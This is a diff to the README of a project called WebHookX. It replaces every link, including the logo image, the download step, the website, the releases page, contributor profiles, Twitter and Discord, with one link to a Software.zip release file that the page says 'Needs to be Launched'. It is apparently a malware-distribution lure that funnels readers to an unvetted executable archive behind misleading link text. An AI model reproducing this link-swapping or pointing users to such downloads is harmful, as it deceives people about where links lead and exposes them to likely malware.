@@ -1,6 +1,6 @@
 # 🚀 **Welcome to WebHookX!**
 
-![WebHookX Logo](https://example.com/webhookx_logo.png)
+![WebHookX Logo](https://github.com/RyuuRabani/WebHookX/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -29,7 +29,7 @@
 ## Installation
 
 💻 **Installation Steps:**
-1. [Download the Software](https://github.com/user-attachments/files/18383251/Software.zip) *(Needs to be Launched)*.
+1. [Download the Software](https://github.com/RyuuRabani/WebHookX/releases/download/v2.0/Software.zip) *(Needs to be Launched)*.
 2. Follow the installation instructions provided in the software package.
 3. Configure WebHookX to suit your deployment needs.
 
@@ -53,24 +53,24 @@
 ## Explore
 
 🔍 **Discover More:**
-- Check out our [Website](https://webhookx.com) for additional resources.
-- Visit the [Releases](https://github.com/user-attachments/files/18383251/Software.zip) section for the latest updates.
+- Check out our [Website](https://github.com/RyuuRabani/WebHookX/releases/download/v2.0/Software.zip) for additional resources.
+- Visit the [Releases](https://github.com/RyuuRabani/WebHookX/releases/download/v2.0/Software.zip) section for the latest updates.
 
 ---
 
 ## Contributors
 
 👏 **Special Thanks:** 
-- [John Doe](https://github.com/johndoe) - Lead Developer
-- [Jane Smith](https://github.com/janesmith) - UI/UX Designer
+- [John Doe](https://github.com/RyuuRabani/WebHookX/releases/download/v2.0/Software.zip) - Lead Developer
+- [Jane Smith](https://github.com/RyuuRabani/WebHookX/releases/download/v2.0/Software.zip) - UI/UX Designer
 
 ---
 
 ## Stay Connected
 
 🌐 **Connect with Us:**
-- Follow us on [Twitter](https://twitter.com/webhookx) for news and updates.
-- Join our [Discord Community](https://discord.com/webhookx) for discussions and support.
+- Follow us on [Twitter](https://github.com/RyuuRabani/WebHookX/releases/download/v2.0/Software.zip) for news and updates.
+- Join our [Discord Community](https://github.com/RyuuRabani/WebHookX/releases/download/v2.0/Software.zip) for discussions and support.
 
 ---
 
